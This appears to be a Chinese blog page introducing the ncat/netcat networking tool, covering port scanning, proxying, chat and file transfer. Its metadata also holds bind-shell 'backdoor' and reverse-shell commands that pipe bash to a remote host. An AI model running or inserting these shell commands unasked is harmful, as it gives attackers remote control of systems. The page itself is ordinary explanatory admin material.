<!DOCTYPE html>
<html lang="zh-cn">

<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
  <title>
Ncat 一个非常强大的 linux 工具 · inaho
</title>
  





<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="color-scheme" content="light dark">





<meta name="author" content="inaho">
<meta name="description" content="
  Ncat 一个非常强大的 linux 工具
  
    
    @
  




  摘要
  
    
    @
  

用 linux 系统的很多人，或多或少都用过 nc 这个命令，全称为 netcat，用于 TCP、UDP 或 unix 域套接字(uds)的数据流操作，但早在 2007 年就不维护了，后续由 nmap 的作者 Fyodor 重写了一个 ncat 的工具，兼容 nc 并且在此基础上增强了部分能力。
那 ncat 这个命令能干什么呢？
比如可以做端口扫描、端口探活、文件传输、远程控制、反弹 shell，还能做端口转发、代理服务，甚至可以作为一个聊天工具，被誉为网络界的瑞士军刀！



  命令帮助
  
    
    @
  

输入命令 ncat -h 可以查看 ncat 命令的帮助文档，接下来介绍一下 ncat 的用法
Ncat 7.95 ( https://nmap.org/ncat )
Usage: ncat [options] [hostname] [port]

Options taking a time assume seconds. Append &#39;ms&#39; for milliseconds,
&#39;s&#39; for seconds, &#39;m&#39; for minutes, or &#39;h&#39; for hours (e.g. 500ms).
  -4                         Use IPv4 only
  -6                         Use IPv6 only
  -U, --unixsock             Use Unix domain sockets only
      --vsock                Use vsock sockets only
  -C, --crlf                 Use CRLF for EOL sequence
  -c, --sh-exec &lt;command&gt;    Executes the given command via /bin/sh
  -e, --exec &lt;command&gt;       Executes the given command
      --lua-exec &lt;filename&gt;  Executes the given Lua script
  -g hop1[,hop2,...]         Loose source routing hop points (8 max)
  -G &lt;n&gt;                     Loose source routing hop pointer (4, 8, 12, ...)
  -m, --max-conns &lt;n&gt;        Maximum &lt;n&gt; simultaneous connections
  -h, --help                 Display this help screen
  -d, --delay &lt;time&gt;         Wait between read/writes
  -o, --output &lt;filename&gt;    Dump session data to a file
  -x, --hex-dump &lt;filename&gt;  Dump session data as hex to a file
  -i, --idle-timeout &lt;time&gt;  Idle read/write timeout
  -p, --source-port port     Specify source port to use
  -s, --source addr          Specify source address to use (doesn&#39;t affect -l)
  -l, --listen               Bind and listen for incoming connections
  -k, --keep-open            Accept multiple connections in listen mode
  -n, --nodns                Do not resolve hostnames via DNS
  -t, --telnet               Answer Telnet negotiations
  -u, --udp                  Use UDP instead of default TCP
      --sctp                 Use SCTP instead of default TCP
  -v, --verbose              Set verbosity level (can be used several times)
  -w, --wait &lt;time&gt;          Connect timeout
  -z                         Zero-I/O mode, report connection status only
      --append-output        Append rather than clobber specified output files
      --send-only            Only send data, ignoring received; quit on EOF
      --recv-only            Only receive data, never send anything
      --no-shutdown          Continue half-duplex when receiving EOF on stdin
      --allow                Allow only given hosts to connect to Ncat
      --allowfile            A file of hosts allowed to connect to Ncat
      --deny                 Deny given hosts from connecting to Ncat
      --denyfile             A file of hosts denied from connecting to Ncat
      --broker               Enable Ncat&#39;s connection brokering mode
      --chat                 Start a simple Ncat chat server
      --proxy &lt;addr[:port]&gt;  Specify address of host to proxy through
      --proxy-type &lt;type&gt;    Specify proxy type (&#34;http&#34;, &#34;socks4&#34;, &#34;socks5&#34;)
      --proxy-auth &lt;auth&gt;    Authenticate with HTTP or SOCKS proxy server
      --proxy-dns &lt;type&gt;     Specify where to resolve proxy destination
      --ssl                  Connect or listen with SSL
      --ssl-cert             Specify SSL certificate file (PEM) for listening
      --ssl-key              Specify SSL private key (PEM) for listening
      --ssl-verify           Verify trust and domain name of certificates
      --ssl-trustfile        PEM file containing trusted SSL certificates
      --ssl-ciphers          Cipherlist containing SSL ciphers to use
      --ssl-servername       Request distinct server name (SNI)
      --ssl-alpn             ALPN protocol list to use
      --version              Display Ncat&#39;s version information and exit

See the ncat(1) manpage for full options, descriptions and usage examples



  端口扫描
  
    
    @
  

nc -v -z -w2 127.0.0.1 1-100 # 扫描本机范围是 1-100的TCP端口，超时时间为2s
nc -u -z -w2 127.0.0.1 1-1000 # 扫描本机范围是 1-1000的UDP端口，超时时间为2s
nc -nvv 127.0.0.1 80 # 扫描指定端口



  端口连接
  
    
    @
  

#监听端口
ncat -l 8080
#连接远程系统
ncat 192.168.1.100 80
#连接udp端口
ncat -l -u 1234
#测试端口连通性
ncat -v -u 192.168.105.150 53



  聊天工具
  
    
    @
  

#nc作为聊天工具
ncat -l 8080     # 服务端
ncat 192.168.1.100 8080    #客户端



  代理转发
  
    
    @
  

#作为代理
#发往服务器 8080 端口的连接都会自动转发到 192.168.1.200 上的 80 端口
ncat -l 8080 | ncat 192.168.1.200 80
#同时能够接受返回的数据，我们需要创建一个双向管道
ncat -l 8080 0&lt;2way | ncat 192.168.1.200 80 1&gt;2way

#端口转发, 连接到 80 端口的连接都会转发到 8080 端口
ncat -u -l  80 -c  &#39;ncat -u -l 8080&#39;



  创建后门
  
    
    @
  

#创建后门, -e 标志将一个 bash 与端口 10000 相连
ncat -l 10000 -e /bin/bash
#客户端只要连接到服务器上的 10000 端口就能通过 bash 获取我们系统的完整访问权限
ncat 192.168.1.100 10000



  文件拷贝
  
    
    @
  

#拷贝文件， -–send-only 选项会在文件拷贝完后立即关闭连接
ncat -l  8080 &gt; file.txt    # 监听
ncat 192.168.1.100 8080 --send-only &lt; data.txt #目标机器把文件传过来



  远程控制
  
    
    @
  

# 正向控制，被控端主动设置监听端口及bash环境，控制端连接，如果有防火墙，需开放端口，否则会被拦截。
# 被控制端执行下面的命令：
nc -lvnp 8888 -c bash
# 控制端执行下面的命令：
nc 192.168.xxx.xxx 8888

# 反向控制，控制端设置监听端口，被控端主动连接控制端的ip及端口，并提供bash环境。
# 控制端执行下面的命令：
nc -lvnp 8888
# 被控制端执行下面的命令：
nc 192.168.75.121 8888 -c bash



  总结
  
    
    @
  

ncat 用法太多，因为 ncat 本质是用于操作 tcp 和 udp 连接数据流的，所以理论上所有基于 4 层网络的操作都可以使用 ncat 来处理，在日常运维中还有更多用法，各位可以继续探索！">
<meta name="keywords" content="blog,developer,personal">






  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="Ncat 一个非常强大的 linux 工具">
  <meta name="twitter:description" content="Ncat 一个非常强大的 linux 工具 @ 摘要 @ 用 linux 系统的很多人，或多或少都用过 nc 这个命令，全称为 netcat，用于 TCP、UDP 或 unix 域套接字(uds)的数据流操作，但早在 2007 年就不维护了，后续由 nmap 的作者 Fyodor 重写了一个 ncat 的工具，兼容 nc 并且在此基础上增强了部分能力。
那 ncat 这个命令能干什么呢？
比如可以做端口扫描、端口探活、文件传输、远程控制、反弹 shell，还能做端口转发、代理服务，甚至可以作为一个聊天工具，被誉为网络界的瑞士军刀！
命令帮助 @ 输入命令 ncat -h 可以查看 ncat 命令的帮助文档，接下来介绍一下 ncat 的用法
Ncat 7.95 ( https://nmap.org/ncat ) Usage: ncat [options] [hostname] [port] Options taking a time assume seconds. Append &#39;ms&#39; for milliseconds, &#39;s&#39; for seconds, &#39;m&#39; for minutes, or &#39;h&#39; for hours (e.g. 500ms). -4 Use IPv4 only -6 Use IPv6 only -U, --unixsock Use Unix domain sockets only --vsock Use vsock sockets only -C, --crlf Use CRLF for EOL sequence -c, --sh-exec &lt;command&gt; Executes the given command via /bin/sh -e, --exec &lt;command&gt; Executes the given command --lua-exec &lt;filename&gt; Executes the given Lua script -g hop1[,hop2,...] Loose source routing hop points (8 max) -G &lt;n&gt; Loose source routing hop pointer (4, 8, 12, ...) -m, --max-conns &lt;n&gt; Maximum &lt;n&gt; simultaneous connections -h, --help Display this help screen -d, --delay &lt;time&gt; Wait between read/writes -o, --output &lt;filename&gt; Dump session data to a file -x, --hex-dump &lt;filename&gt; Dump session data as hex to a file -i, --idle-timeout &lt;time&gt; Idle read/write timeout -p, --source-port port Specify source port to use -s, --source addr Specify source address to use (doesn&#39;t affect -l) -l, --listen Bind and listen for incoming connections -k, --keep-open Accept multiple connections in listen mode -n, --nodns Do not resolve hostnames via DNS -t, --telnet Answer Telnet negotiations -u, --udp Use UDP instead of default TCP --sctp Use SCTP instead of default TCP -v, --verbose Set verbosity level (can be used several times) -w, --wait &lt;time&gt; Connect timeout -z Zero-I/O mode, report connection status only --append-output Append rather than clobber specified output files --send-only Only send data, ignoring received; quit on EOF --recv-only Only receive data, never send anything --no-shutdown Continue half-duplex when receiving EOF on stdin --allow Allow only given hosts to connect to Ncat --allowfile A file of hosts allowed to connect to Ncat --deny Deny given hosts from connecting to Ncat --denyfile A file of hosts denied from connecting to Ncat --broker Enable Ncat&#39;s connection brokering mode --chat Start a simple Ncat chat server --proxy &lt;addr[:port]&gt; Specify address of host to proxy through --proxy-type &lt;type&gt; Specify proxy type (&#34;http&#34;, &#34;socks4&#34;, &#34;socks5&#34;) --proxy-auth &lt;auth&gt; Authenticate with HTTP or SOCKS proxy server --proxy-dns &lt;type&gt; Specify where to resolve proxy destination --ssl Connect or listen with SSL --ssl-cert Specify SSL certificate file (PEM) for listening --ssl-key Specify SSL private key (PEM) for listening --ssl-verify Verify trust and domain name of certificates --ssl-trustfile PEM file containing trusted SSL certificates --ssl-ciphers Cipherlist containing SSL ciphers to use --ssl-servername Request distinct server name (SNI) --ssl-alpn ALPN protocol list to use --version Display Ncat&#39;s version information and exit See the ncat(1) manpage for full options, descriptions and usage examples 端口扫描 @ nc -v -z -w2 127.0.0.1 1-100 # 扫描本机范围是 1-100的TCP端口，超时时间为2s nc -u -z -w2 127.0.0.1 1-1000 # 扫描本机范围是 1-1000的UDP端口，超时时间为2s nc -nvv 127.0.0.1 80 # 扫描指定端口 端口连接 @ #监听端口 ncat -l 8080 #连接远程系统 ncat 192.168.1.100 80 #连接udp端口 ncat -l -u 1234 #测试端口连通性 ncat -v -u 192.168.105.150 53 聊天工具 @ #nc作为聊天工具 ncat -l 8080 # 服务端 ncat 192.168.1.100 8080 #客户端 代理转发 @ #作为代理 #发往服务器 8080 端口的连接都会自动转发到 192.168.1.200 上的 80 端口 ncat -l 8080 | ncat 192.168.1.200 80 #同时能够接受返回的数据，我们需要创建一个双向管道 ncat -l 8080 0&lt;2way | ncat 192.168.1.200 80 1&gt;2way #端口转发, 连接到 80 端口的连接都会转发到 8080 端口 ncat -u -l 80 -c &#39;ncat -u -l 8080&#39; 创建后门 @ #创建后门, -e 标志将一个 bash 与端口 10000 相连 ncat -l 10000 -e /bin/bash #客户端只要连接到服务器上的 10000 端口就能通过 bash 获取我们系统的完整访问权限 ncat 192.168.1.100 10000 文件拷贝 @ #拷贝文件， -–send-only 选项会在文件拷贝完后立即关闭连接 ncat -l 8080 &gt; file.txt # 监听 ncat 192.168.1.100 8080 --send-only &lt; data.txt #目标机器把文件传过来 远程控制 @ # 正向控制，被控端主动设置监听端口及bash环境，控制端连接，如果有防火墙，需开放端口，否则会被拦截。 # 被控制端执行下面的命令： nc -lvnp 8888 -c bash # 控制端执行下面的命令： nc 192.168.xxx.xxx 8888 # 反向控制，控制端设置监听端口，被控端主动连接控制端的ip及端口，并提供bash环境。 # 控制端执行下面的命令： nc -lvnp 8888 # 被控制端执行下面的命令： nc 192.168.75.121 8888 -c bash 总结 @ ncat 用法太多，因为 ncat 本质是用于操作 tcp 和 udp 连接数据流的，所以理论上所有基于 4 层网络的操作都可以使用 ncat 来处理，在日常运维中还有更多用法，各位可以继续探索！">
 
<meta property="og:url" content="//localhost:1313/posts/ylyudgz8dowgftxqp94c0cognqc/">
  <meta property="og:site_name" content="inaho">
  <meta property="og:title" content="Ncat 一个非常强大的 linux 工具">
  <meta property="og:description" content="Ncat 一个非常强大的 linux 工具 @ 摘要 @ 用 linux 系统的很多人，或多或少都用过 nc 这个命令，全称为 netcat，用于 TCP、UDP 或 unix 域套接字(uds)的数据流操作，但早在 2007 年就不维护了，后续由 nmap 的作者 Fyodor 重写了一个 ncat 的工具，兼容 nc 并且在此基础上增强了部分能力。
那 ncat 这个命令能干什么呢？
比如可以做端口扫描、端口探活、文件传输、远程控制、反弹 shell，还能做端口转发、代理服务，甚至可以作为一个聊天工具，被誉为网络界的瑞士军刀！
命令帮助 @ 输入命令 ncat -h 可以查看 ncat 命令的帮助文档，接下来介绍一下 ncat 的用法
Ncat 7.95 ( https://nmap.org/ncat ) Usage: ncat [options] [hostname] [port] Options taking a time assume seconds. Append &#39;ms&#39; for milliseconds, &#39;s&#39; for seconds, &#39;m&#39; for minutes, or &#39;h&#39; for hours (e.g. 500ms). -4 Use IPv4 only -6 Use IPv6 only -U, --unixsock Use Unix domain sockets only --vsock Use vsock sockets only -C, --crlf Use CRLF for EOL sequence -c, --sh-exec &lt;command&gt; Executes the given command via /bin/sh -e, --exec &lt;command&gt; Executes the given command --lua-exec &lt;filename&gt; Executes the given Lua script -g hop1[,hop2,...] Loose source routing hop points (8 max) -G &lt;n&gt; Loose source routing hop pointer (4, 8, 12, ...) -m, --max-conns &lt;n&gt; Maximum &lt;n&gt; simultaneous connections -h, --help Display this help screen -d, --delay &lt;time&gt; Wait between read/writes -o, --output &lt;filename&gt; Dump session data to a file -x, --hex-dump &lt;filename&gt; Dump session data as hex to a file -i, --idle-timeout &lt;time&gt; Idle read/write timeout -p, --source-port port Specify source port to use -s, --source addr Specify source address to use (doesn&#39;t affect -l) -l, --listen Bind and listen for incoming connections -k, --keep-open Accept multiple connections in listen mode -n, --nodns Do not resolve hostnames via DNS -t, --telnet Answer Telnet negotiations -u, --udp Use UDP instead of default TCP --sctp Use SCTP instead of default TCP -v, --verbose Set verbosity level (can be used several times) -w, --wait &lt;time&gt; Connect timeout -z Zero-I/O mode, report connection status only --append-output Append rather than clobber specified output files --send-only Only send data, ignoring received; quit on EOF --recv-only Only receive data, never send anything --no-shutdown Continue half-duplex when receiving EOF on stdin --allow Allow only given hosts to connect to Ncat --allowfile A file of hosts allowed to connect to Ncat --deny Deny given hosts from connecting to Ncat --denyfile A file of hosts denied from connecting to Ncat --broker Enable Ncat&#39;s connection brokering mode --chat Start a simple Ncat chat server --proxy &lt;addr[:port]&gt; Specify address of host to proxy through --proxy-type &lt;type&gt; Specify proxy type (&#34;http&#34;, &#34;socks4&#34;, &#34;socks5&#34;) --proxy-auth &lt;auth&gt; Authenticate with HTTP or SOCKS proxy server --proxy-dns &lt;type&gt; Specify where to resolve proxy destination --ssl Connect or listen with SSL --ssl-cert Specify SSL certificate file (PEM) for listening --ssl-key Specify SSL private key (PEM) for listening --ssl-verify Verify trust and domain name of certificates --ssl-trustfile PEM file containing trusted SSL certificates --ssl-ciphers Cipherlist containing SSL ciphers to use --ssl-servername Request distinct server name (SNI) --ssl-alpn ALPN protocol list to use --version Display Ncat&#39;s version information and exit See the ncat(1) manpage for full options, descriptions and usage examples 端口扫描 @ nc -v -z -w2 127.0.0.1 1-100 # 扫描本机范围是 1-100的TCP端口，超时时间为2s nc -u -z -w2 127.0.0.1 1-1000 # 扫描本机范围是 1-1000的UDP端口，超时时间为2s nc -nvv 127.0.0.1 80 # 扫描指定端口 端口连接 @ #监听端口 ncat -l 8080 #连接远程系统 ncat 192.168.1.100 80 #连接udp端口 ncat -l -u 1234 #测试端口连通性 ncat -v -u 192.168.105.150 53 聊天工具 @ #nc作为聊天工具 ncat -l 8080 # 服务端 ncat 192.168.1.100 8080 #客户端 代理转发 @ #作为代理 #发往服务器 8080 端口的连接都会自动转发到 192.168.1.200 上的 80 端口 ncat -l 8080 | ncat 192.168.1.200 80 #同时能够接受返回的数据，我们需要创建一个双向管道 ncat -l 8080 0&lt;2way | ncat 192.168.1.200 80 1&gt;2way #端口转发, 连接到 80 端口的连接都会转发到 8080 端口 ncat -u -l 80 -c &#39;ncat -u -l 8080&#39; 创建后门 @ #创建后门, -e 标志将一个 bash 与端口 10000 相连 ncat -l 10000 -e /bin/bash #客户端只要连接到服务器上的 10000 端口就能通过 bash 获取我们系统的完整访问权限 ncat 192.168.1.100 10000 文件拷贝 @ #拷贝文件， -–send-only 选项会在文件拷贝完后立即关闭连接 ncat -l 8080 &gt; file.txt # 监听 ncat 192.168.1.100 8080 --send-only &lt; data.txt #目标机器把文件传过来 远程控制 @ # 正向控制，被控端主动设置监听端口及bash环境，控制端连接，如果有防火墙，需开放端口，否则会被拦截。 # 被控制端执行下面的命令： nc -lvnp 8888 -c bash # 控制端执行下面的命令： nc 192.168.xxx.xxx 8888 # 反向控制，控制端设置监听端口，被控端主动连接控制端的ip及端口，并提供bash环境。 # 控制端执行下面的命令： nc -lvnp 8888 # 被控制端执行下面的命令： nc 192.168.75.121 8888 -c bash 总结 @ ncat 用法太多，因为 ncat 本质是用于操作 tcp 和 udp 连接数据流的，所以理论上所有基于 4 层网络的操作都可以使用 ncat 来处理，在日常运维中还有更多用法，各位可以继续探索！">
  <meta property="og:locale" content="zh_cn">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2025-02-27T00:00:00+00:00">
    <meta property="article:modified_time" content="2025-02-27T00:00:00+00:00">
    <meta property="article:tag" content="Linux">






<link rel="canonical" href="//localhost:1313/posts/ylyudgz8dowgftxqp94c0cognqc/">








<link rel="preload" href="/fonts/fa-brands-400.woff2" as="font" type="font/woff2" crossorigin>
<link rel="preload" href="/fonts/fa-regular-400.woff2" as="font" type="font/woff2" crossorigin>
<link rel="preload" href="/fonts/fa-solid-900.woff2" as="font" type="font/woff2" crossorigin>



  
  
  <link rel="stylesheet" href="/css/coder.css" media="screen">








  
    
    
    <link rel="stylesheet" href="/css/coder-dark.css" media="screen">
  







 
<link rel="icon" type="image/svg+xml" href="/images/favicon.svg" sizes="any">
<link rel="icon" type="image/png" href="/images/favicon-32x32.png" sizes="32x32">
<link rel="icon" type="image/png" href="/images/favicon-16x16.png" sizes="16x16">

<link rel="apple-touch-icon" href="/images/apple-touch-icon.png">
<link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">

<link rel="manifest" href="/site.webmanifest">
<link rel="mask-icon" href="/images/safari-pinned-tab.svg" color="#5bbad5">
 









<script type="text/javascript"
        async
        src="https://cdn.bootcss.com/mathjax/2.7.3/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
MathJax.Hub.Config({
  tex2jax: {
    inlineMath: [['$','$'], ['\\(','\\)']],
    displayMath: [['$$','$$'], ['\[\[','\]\]']],
    processEscapes: true,
    processEnvironments: true,
    skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
    TeX: { equationNumbers: { autoNumber: "AMS" },
         extensions: ["AMSmath.js", "AMSsymbols.js"] }
  }
});

MathJax.Hub.Queue(function() {
    
    
    
    var all = MathJax.Hub.getAllJax(), i;
    for(i = 0; i < all.length; i += 1) {
        all[i].SourceElement().parentNode.className += ' has-jax';
    }
});
</script>

<style>
code.has-jax {
    font: inherit;
    font-size: 100%;
    background: inherit;
    border: inherit;
    color: #515151;
}
</style>

<script src="//yihui.org/js/math-code.js" defer></script>
<script defer
  src="//mathjax.rstudio.com/latest/MathJax.js?config=TeX-MML-AM_CHTML">
</script> 

</head>






<body class="preload-transitions colorscheme-auto">
  



<div class="float-container">
    <a id="dark-mode-toggle" class="colorscheme-toggle">
        <i class="button-icon"></i>
    </a>
</div>


  <main class="wrapper">
    <nav class="navigation">
  <section class="container">
    
    
    <a class="navigation-title" href="//localhost:1313/">
      inaho
    </a>
    
    
    
      <input type="checkbox" id="menu-toggle" />
      <label class="menu-button float-right" for="menu-toggle">
          <div class="line-middle"></div>
      </label>
      
      <ul class="navigation-list">
        
          
            <li class="navigation-item">
              <a class="navigation-link " href="/posts/">文章</a>
            </li>
          
            <li class="navigation-item">
              <a class="navigation-link " href="/tags/">标签</a>
            </li>
          
            <li class="navigation-item">
              <a class="navigation-link " href="/categories/">分类</a>
            </li>
          
            <li class="navigation-item">
              <a class="navigation-link " href="/about/">关于</a>
            </li>
          
            <li class="navigation-item">
              <a class="navigation-link " href="/friends/">友链</a>
            </li>
          
        
        
        
      </ul>
    
  </section>
</nav>


    <div class="content">
      
<aside class="table-of-contents">
  <div class="toc-container">
    <h2>目录</h2>
    
    <nav id="TableOfContents">
  <ul>
    <li><a href="#ncat-一个非常强大的-linux-工具">Ncat 一个非常强大的 linux 工具</a>
      <ul>
        <li><a href="#摘要">摘要</a></li>
        <li><a href="#命令帮助">命令帮助</a></li>
        <li><a href="#端口扫描">端口扫描</a></li>
        <li><a href="#端口连接">端口连接</a></li>
        <li><a href="#聊天工具">聊天工具</a></li>
        <li><a href="#代理转发">代理转发</a></li>
        <li><a href="#创建后门">创建后门</a></li>
        <li><a href="#文件拷贝">文件拷贝</a></li>
        <li><a href="#远程控制">远程控制</a></li>
        <li><a href="#总结">总结</a></li>
      </ul>
    </li>
  </ul>
</nav>
    
  </div>
</aside>
<section class="container post">
  <article>
    <header>
      <div class="post-title">
        <h1 class="title">
          <a class="title-link" href="//localhost:1313/posts/ylyudgz8dowgftxqp94c0cognqc/">
            Ncat 一个非常强大的 linux 工具
          </a>
        </h1>
      </div>
      <div class="post-meta">
        <div class="date">
          <span class="posted-on">
            <i class="fa-solid fa-calendar" aria-hidden="true"></i>
            <time datetime=" 2025-02-27T00:00:00Z">
              2025-02-27
            </time>
          </span>
          <span class="reading-time">
            <i class="fa-solid fa-clock" aria-hidden="true"></i>
            阅读时间：4 分钟
          </span>
          <span class="post-word-count">
            <i class="fa fa-pie-chart" aria-hidden="true" style="margin-left: 10px;"></i>
            17670 字
          </span>
        </div>
        

<div class="authors">
  <i class="fa-solid fa-user" aria-hidden="true"></i>
  <a href="/authors/lzy/">Lzy</a></div>
        

<div class="categories">
  <i class="fa-solid fa-folder" aria-hidden="true"></i>
  <a href="/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E6%A1%A3/">技术文档</a></div>
        

<div class="tags">
  <i class="fa-solid fa-tag" aria-hidden="true"></i>
  <span class="tag">
    <a href="/tags/linux/">Linux</a>
  </span></div>
      </div>
    </header>

    <div class="post-content">
      
      

<h1 id="ncat-一个非常强大的-linux-工具">
  Ncat 一个非常强大的 linux 工具
  <a class="heading-link" href="#ncat-%e4%b8%80%e4%b8%aa%e9%9d%9e%e5%b8%b8%e5%bc%ba%e5%a4%a7%e7%9a%84-linux-%e5%b7%a5%e5%85%b7">
    <i class="fa-solid fa-link" aria-hidden="true" title="@"></i>
    <span class="sr-only">@</span>
  </a>
</h1>


<h2 id="摘要">
  摘要
  <a class="heading-link" href="#%e6%91%98%e8%a6%81">
    <i class="fa-solid fa-link" aria-hidden="true" title="@"></i>
    <span class="sr-only">@</span>
  </a>
</h2>
<p>用 linux 系统的很多人，或多或少都用过 nc 这个命令，全称为 netcat，用于 TCP、UDP 或 unix 域套接字(uds)的数据流操作，但早在 2007 年就不维护了，后续由 nmap 的作者 Fyodor 重写了一个 ncat 的工具，兼容 nc 并且在此基础上增强了部分能力。</p>
<p>那 ncat 这个命令能干什么呢？</p>
<p>比如可以做端口扫描、端口探活、文件传输、远程控制、反弹 shell，还能做端口转发、代理服务，甚至可以作为一个聊天工具，被誉为网络界的瑞士军刀！</p>


<h2 id="命令帮助">
  命令帮助
  <a class="heading-link" href="#%e5%91%bd%e4%bb%a4%e5%b8%ae%e5%8a%a9">
    <i class="fa-solid fa-link" aria-hidden="true" title="@"></i>
    <span class="sr-only">@</span>
  </a>
</h2>
<p>输入命令 ncat -h 可以查看 ncat 命令的帮助文档，接下来介绍一下 ncat 的用法</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">Ncat 7.95 <span class="o">(</span> https://nmap.org/ncat <span class="o">)</span>
</span></span><span class="line"><span class="cl">Usage: ncat <span class="o">[</span>options<span class="o">]</span> <span class="o">[</span>hostname<span class="o">]</span> <span class="o">[</span>port<span class="o">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Options taking a <span class="nb">time</span> assume seconds. Append <span class="s1">&#39;ms&#39;</span> <span class="k">for</span> milliseconds,
</span></span><span class="line"><span class="cl"><span class="s1">&#39;s&#39;</span> <span class="k">for</span> seconds, <span class="s1">&#39;m&#39;</span> <span class="k">for</span> minutes, or <span class="s1">&#39;h&#39;</span> <span class="k">for</span> hours <span class="o">(</span>e.g. 500ms<span class="o">)</span>.
</span></span><span class="line"><span class="cl">  -4                         Use IPv4 only
</span></span><span class="line"><span class="cl">  -6                         Use IPv6 only
</span></span><span class="line"><span class="cl">  -U, --unixsock             Use Unix domain sockets only
</span></span><span class="line"><span class="cl">      --vsock                Use vsock sockets only
</span></span><span class="line"><span class="cl">  -C, --crlf                 Use CRLF <span class="k">for</span> EOL sequence
</span></span><span class="line"><span class="cl">  -c, --sh-exec &lt;command&gt;    Executes the given <span class="nb">command</span> via /bin/sh
</span></span><span class="line"><span class="cl">  -e, --exec &lt;command&gt;       Executes the given <span class="nb">command</span>
</span></span><span class="line"><span class="cl">      --lua-exec &lt;filename&gt;  Executes the given Lua script
</span></span><span class="line"><span class="cl">  -g hop1<span class="o">[</span>,hop2,...<span class="o">]</span>         Loose <span class="nb">source</span> routing hop points <span class="o">(</span><span class="m">8</span> max<span class="o">)</span>
</span></span><span class="line"><span class="cl">  -G &lt;n&gt;                     Loose <span class="nb">source</span> routing hop pointer <span class="o">(</span>4, 8, 12, ...<span class="o">)</span>
</span></span><span class="line"><span class="cl">  -m, --max-conns &lt;n&gt;        Maximum &lt;n&gt; simultaneous connections
</span></span><span class="line"><span class="cl">  -h, --help                 Display this <span class="nb">help</span> screen
</span></span><span class="line"><span class="cl">  -d, --delay &lt;time&gt;         Wait between read/writes
</span></span><span class="line"><span class="cl">  -o, --output &lt;filename&gt;    Dump session data to a file
</span></span><span class="line"><span class="cl">  -x, --hex-dump &lt;filename&gt;  Dump session data as hex to a file
</span></span><span class="line"><span class="cl">  -i, --idle-timeout &lt;time&gt;  Idle read/write timeout
</span></span><span class="line"><span class="cl">  -p, --source-port port     Specify <span class="nb">source</span> port to use
</span></span><span class="line"><span class="cl">  -s, --source addr          Specify <span class="nb">source</span> address to use <span class="o">(</span>doesn<span class="s1">&#39;t affect -l)
</span></span></span><span class="line"><span class="cl"><span class="s1">  -l, --listen               Bind and listen for incoming connections
</span></span></span><span class="line"><span class="cl"><span class="s1">  -k, --keep-open            Accept multiple connections in listen mode
</span></span></span><span class="line"><span class="cl"><span class="s1">  -n, --nodns                Do not resolve hostnames via DNS
</span></span></span><span class="line"><span class="cl"><span class="s1">  -t, --telnet               Answer Telnet negotiations
</span></span></span><span class="line"><span class="cl"><span class="s1">  -u, --udp                  Use UDP instead of default TCP
</span></span></span><span class="line"><span class="cl"><span class="s1">      --sctp                 Use SCTP instead of default TCP
</span></span></span><span class="line"><span class="cl"><span class="s1">  -v, --verbose              Set verbosity level (can be used several times)
</span></span></span><span class="line"><span class="cl"><span class="s1">  -w, --wait &lt;time&gt;          Connect timeout
</span></span></span><span class="line"><span class="cl"><span class="s1">  -z                         Zero-I/O mode, report connection status only
</span></span></span><span class="line"><span class="cl"><span class="s1">      --append-output        Append rather than clobber specified output files
</span></span></span><span class="line"><span class="cl"><span class="s1">      --send-only            Only send data, ignoring received; quit on EOF
</span></span></span><span class="line"><span class="cl"><span class="s1">      --recv-only            Only receive data, never send anything
</span></span></span><span class="line"><span class="cl"><span class="s1">      --no-shutdown          Continue half-duplex when receiving EOF on stdin
</span></span></span><span class="line"><span class="cl"><span class="s1">      --allow                Allow only given hosts to connect to Ncat
</span></span></span><span class="line"><span class="cl"><span class="s1">      --allowfile            A file of hosts allowed to connect to Ncat
</span></span></span><span class="line"><span class="cl"><span class="s1">      --deny                 Deny given hosts from connecting to Ncat
</span></span></span><span class="line"><span class="cl"><span class="s1">      --denyfile             A file of hosts denied from connecting to Ncat
</span></span></span><span class="line"><span class="cl"><span class="s1">      --broker               Enable Ncat&#39;</span>s connection brokering mode
</span></span><span class="line"><span class="cl">      --chat                 Start a simple Ncat chat server
</span></span><span class="line"><span class="cl">      --proxy &lt;addr<span class="o">[</span>:port<span class="o">]</span>&gt;  Specify address of host to proxy through
</span></span><span class="line"><span class="cl">      --proxy-type &lt;type&gt;    Specify proxy <span class="nb">type</span> <span class="o">(</span><span class="s2">&#34;http&#34;</span>, <span class="s2">&#34;socks4&#34;</span>, <span class="s2">&#34;socks5&#34;</span><span class="o">)</span>
</span></span><span class="line"><span class="cl">      --proxy-auth &lt;auth&gt;    Authenticate with HTTP or SOCKS proxy server
</span></span><span class="line"><span class="cl">      --proxy-dns &lt;type&gt;     Specify where to resolve proxy destination
</span></span><span class="line"><span class="cl">      --ssl                  Connect or listen with SSL
</span></span><span class="line"><span class="cl">      --ssl-cert             Specify SSL certificate file <span class="o">(</span>PEM<span class="o">)</span> <span class="k">for</span> listening
</span></span><span class="line"><span class="cl">      --ssl-key              Specify SSL private key <span class="o">(</span>PEM<span class="o">)</span> <span class="k">for</span> listening
</span></span><span class="line"><span class="cl">      --ssl-verify           Verify trust and domain name of certificates
</span></span><span class="line"><span class="cl">      --ssl-trustfile        PEM file containing trusted SSL certificates
</span></span><span class="line"><span class="cl">      --ssl-ciphers          Cipherlist containing SSL ciphers to use
</span></span><span class="line"><span class="cl">      --ssl-servername       Request distinct server name <span class="o">(</span>SNI<span class="o">)</span>
</span></span><span class="line"><span class="cl">      --ssl-alpn             ALPN protocol list to use
</span></span><span class="line"><span class="cl">      --version              Display Ncat<span class="err">&#39;</span>s version information and <span class="nb">exit</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">See the ncat<span class="o">(</span>1<span class="o">)</span> manpage <span class="k">for</span> full options, descriptions and usage examples
</span></span></code></pre></div>

<h2 id="端口扫描">
  端口扫描
  <a class="heading-link" href="#%e7%ab%af%e5%8f%a3%e6%89%ab%e6%8f%8f">
